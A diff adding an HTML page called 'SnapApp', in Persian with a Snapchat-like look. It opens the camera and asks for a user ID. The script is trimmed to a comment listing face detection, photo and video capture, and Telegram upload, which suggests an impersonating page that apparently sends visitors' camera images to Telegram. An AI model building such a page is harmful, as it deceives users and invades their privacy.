@@ -1,0 +1,39 @@
+
+<!DOCTYPE html>
+<html lang="fa">
+<head>
+  <meta charset="UTF-8">
+  <title>SnapApp</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <link href="https://cdn.jsdelivr.net/gh/rastikerdar/vazirmatn@v33.003/Vazirmatn-font-face.css" rel="stylesheet">
+  <script src="https://cdn.tailwindcss.com"></script>
+  <script src="https://unpkg.com/lucide@latest"></script>
+  <style>
+    body { margin: 0; background: #fffc00; font-family: 'Vazirmatn', sans-serif; direction: rtl; }
+    #videoContainer { position: fixed; top: 0; left: 0; width: 100%; height: 100%; overflow: hidden; }
+    video { width: 100%; height: 100%; object-fit: cover; }
+    #controls { position: absolute; bottom: 24px; width: 100%; display: flex; justify-content: center; align-items: center; gap: 24px; }
+    #shootBtn { background: white; border-radius: 50%; width: 70px; height: 70px; border: 6px solid #000; }
+    #switchBtn { background: rgba(255,255,255,0.8); border-radius: 50%; width: 48px; height: 48px; display: flex; align-items: center; justify-content: center; }
+    #userInput { position: absolute; top: 20px; width: 100%; display: flex; justify-content: center; }
+    #userId { padding: 10px 16px; border-radius: 12px; border: none; outline: none; }
+  </style>
+</head>
+<body>
+<div id="videoContainer">
+  <video id="video" autoplay playsinline></video>
+  <div id="userInput">
+    <input id="userId" type="text" placeholder="آیدی شما..." />
+  </div>
+  <div id="controls">
+    <div id="switchBtn"><i data-lucide="camera"></i></div>
+    <div id="shootBtn"></div>
+  </div>
+</div>
+
+<script>
+// JS Code Goes Here (camera setup, face detection, photo/video capture, Telegram upload)
+// ... (trimmed for brevity)
+</script>
+</body>
+</html>
